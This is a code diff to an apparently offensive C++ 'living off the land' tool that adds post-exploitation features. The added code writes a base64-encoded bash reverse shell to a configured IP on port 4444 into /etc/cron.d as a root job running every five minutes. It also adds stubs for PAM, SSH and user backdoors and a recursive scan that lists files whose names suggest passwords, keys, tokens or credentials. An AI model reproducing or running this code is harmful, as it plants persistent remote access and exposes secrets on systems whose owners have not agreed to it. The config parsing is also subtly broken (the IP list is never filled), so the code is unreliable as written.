@@ -2,11 +2,14 @@
 #include "../modules/executils.h"
 #include "../modules/parsers.h"
 #include "../tools/portscanner.h"
+#include "../modules/base64.h"
+#include <sstream>
 #include <string>
 #include <exception>
 #include <iostream>
 #include <cstdlib>
 #include <vector>
+#include <filesystem>
 
 #define RESET   "\033[0m"
 #define RED     "\033[31m"
@@ -37,10 +40,21 @@ void Init::welcome() {
 
 
 Author:  c0d3Ninja
-Version: v0.11
+Version: v0.15
 
 ========================================================
     )" << RESET << std::endl;
+}
+
+// Find senstive files by recursively scanning current path
+namespace fs = std::filesystem;
+std::vector<std::string> sensitiveFiles() {
+    std::vector<std::string> content;
+    std::string currentPath = fs::current_path();
+    for (const fs::directory_entry& dir_entry : fs::recursive_directory_iterator(currentPath, fs::directory_options::skip_permission_denied)) {
+        content.push_back(dir_entry.path().string());
+    }
+    return content;
 }
 
 
@@ -49,6 +63,12 @@ Version: v0.11
 struct Config{
     std::vector<std::string> required;
     std::vector<std::string> optional;
+    std::vector<std::string> backdoor;
+    std::vector<std::string> pam;
+    std::vector<std::string> cron;
+    std::vector<std::string> ssh;
+    std::vector<std::string> user;
+    std::vector<std::string> ip;
     std::vector<std::string> credPaths;
     std::vector<std::string> bashHistory;
     std::vector<std::string> requiredCommands;
@@ -74,12 +94,61 @@ void Init::checkDependencies() {
 
     ParseConf.required = parseDependencies("config/lotl.conf", "required");
     ParseConf.optional = parseDependencies("config/lotl.conf", "optional");
-    ParseConf.credPaths = parseDependencies("config/lotl.conf", "checkCreds");
+    ParseConf.backdoor = parseDependencies("config/lotl.conf", "backdoor");
+    ParseConf.backdoor = parseDependencies("config/lotl.conf", "ip");
+    ParseConf.pam = parseDependencies("config/lotl.conf", "pam");
+    ParseConf.cron = parseDependencies("config/lotl.conf", "cron");
+    ParseConf.ssh = parseDependencies("config/lotl.conf", "ssh");
+    ParseConf.user = parseDependencies("config/lotl.conf", "user");
+    ParseConf.credPaths = parsePaths("config/lotl.conf", "checkCreds");
     ParseConf.bashHistory = parsePaths("config/lotl.conf", "checkBashHistory");
     ParseConf.logs = parsePaths("config/lotl.conf", "checkLogs");
     ParseConf.checkSSH = parsePaths("config/lotl.conf", "checkSSH");
     ParseConf.backUP = parsePaths("config/lotl.conf", "CheckBackUp");
     ParseConf.sensitive = parsePaths("config/lotl.conf", "checkSensitive");
+
+    // Get the ip from the conf file to use for the backdoor
+    std::vector<std::string> IP;
+    for (const auto& ipAddress : ParseConf.ip) {
+        IP.push_back(ipAddress);
+    }
+
+    // check backdoor option
+    if (std::find(ParseConf.backdoor.begin(), ParseConf.backdoor.end(), "yes") != ParseConf.backdoor.end()) {
+        for (const auto& pamOption : ParseConf.pam) {
+            if (pamOption == "yes") {
+                // pam code
+            }
+        }
+        for (const auto& cronOption : ParseConf.cron) {
+            if (cronOption == "yes") {
+                std::string payload = "bash -i >& /dev/tcp/" + IP[0] + "/4444 0>&1";
+                std::string encoded = base64_encode(payload);
+                std::ostringstream cronJob;
+                cronJob << "printf '*/5 * * * * root bash -c \"$(echo " << encoded << " | base64 -d)\"\\n' > /etc/cron.d/rev";
+                std::string cmd = cronJob.str();
+                std::string output = execCommand(cmd.c_str()); 
+                std::string check = "grep 'base64 -d' /etc/cron.d/rev";
+                int result = std::system(check.c_str());
+                if (result == 0) {
+                    std::cout << "Cron job exists!\n";
+                } else {
+                    std::cout << "Backdoor was not added!\n";
+                }
+            }
+        }
+        for (const auto& sshOption : ParseConf.ssh) {
+            if (sshOption == "yes") {
+                // process ssh
+            }
+        }
+
+        for (const auto& userOption : ParseConf.user) {
+            if (userOption == "yes"){
+                // process user
+            }
+        }
+    }
 
     for (const auto& path : ParseConf.credPaths) {
         if (checkPaths(path) == 1) {
@@ -231,7 +300,6 @@ void Init::checkDependencies() {
                     inet = ip;
                     int startPort = 1;
                     int endPort = 10000;
-                
                     for (int port = startPort; port <= endPort; ++port) {
                         if (isPortOpen(ip, port)) {
                             openPorts.push_back(port);
@@ -247,19 +315,46 @@ void Init::checkDependencies() {
     std::cout << "\n";
 
     std::cout << RED << "\t================= System Information =================\n\n" << RESET;
+
     std::cout << "Uname: " << YELLOW << unameResults << RESET << "\n\n";
     std::cout << "Hostname: " << YELLOW << hostnameResults << RESET << "\n\n";
     std::cout << "Uptime: " << YELLOW << uptimeResults << RESET << "\n\n";
     std::cout << "Mount: \n" << YELLOW << mountResults << RESET << "\n\n";
     std::cout << "Local IP: " << YELLOW << inet << RESET << "\n\n";
     std::cout << "Open Ports: ";
+    std::string parsePort;
     for (int ports : openPorts) {
-        std::cout << YELLOW << ports << "," << RESET;
+        parsePort += std::to_string(ports) + ",";
     }
+    parsePort.pop_back();
+    std::cout << YELLOW << parsePort << RESET;
+    std::cout << "\n\n";
+    
+    std::cout << RED << "\t======================================================\n\n\n\n" << RESET;
+
+
+
+    std::cout << RED << "\t================= Sensitive Information ===============\n\n" << RESET;
+
+    std::string currentPath = fs::current_path();
+    std::cout << "Path: " << currentPath << "\n";
+    std::vector<std::string> results = sensitiveFiles();
+    std::vector<std::string> secrets = {"config", "keys", "password", "tokens", 
+        "credentials", "secret", "private", "public", "ssh", "rsa", 
+        "pem", "key", "token", "credential", "credentials",
+        "auth", "database", "conf" };
+
+    for (const std::string& files : results) {
+        for (const std::string& secret : secrets) {
+            if (files.find(secret) != std::string::npos) {
+                std::cout << secret << " in " << MAGENTA << files << RESET << "\n";
+            }
+        }
+    }
+
     std::cout << "\n\n";
     
     std::cout << RED << "\t======================================================\n\n" << RESET;
-
 
     std::cout << "\n";
     std::cout << RED << "Displaying the contents of the paths that might contain creds..." << "\n\n";
